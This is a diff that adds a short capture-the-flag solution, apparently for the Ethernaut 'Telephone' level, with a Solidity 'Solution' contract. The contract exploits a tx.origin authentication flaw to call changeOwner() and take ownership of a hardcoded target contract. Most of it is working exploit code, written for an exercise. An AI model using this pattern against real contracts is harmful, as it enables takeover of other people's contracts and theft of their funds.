@@ -1,0 +1,15 @@
+We can simply become the owner of the Telephone contract if we can call the Telephone.changeOwner() from a contract ("Solution") which in turn is called from another contract or EOA - thus satisfying the tx.origin != msg.sender criteria.
+
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.14;
+
+contract Solution
+{
+    address telephoneContract = 0xf8e81D47203A594245E36C48e151709F0C19fBe8;
+
+    function attack() public
+    {
+        (bool success,) = telephoneContract.call(abi.encodeWithSignature("changeOwner(address)", address(0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B)));
+        require(success == true, "Call to changeOwner() failed");
+    }
+}
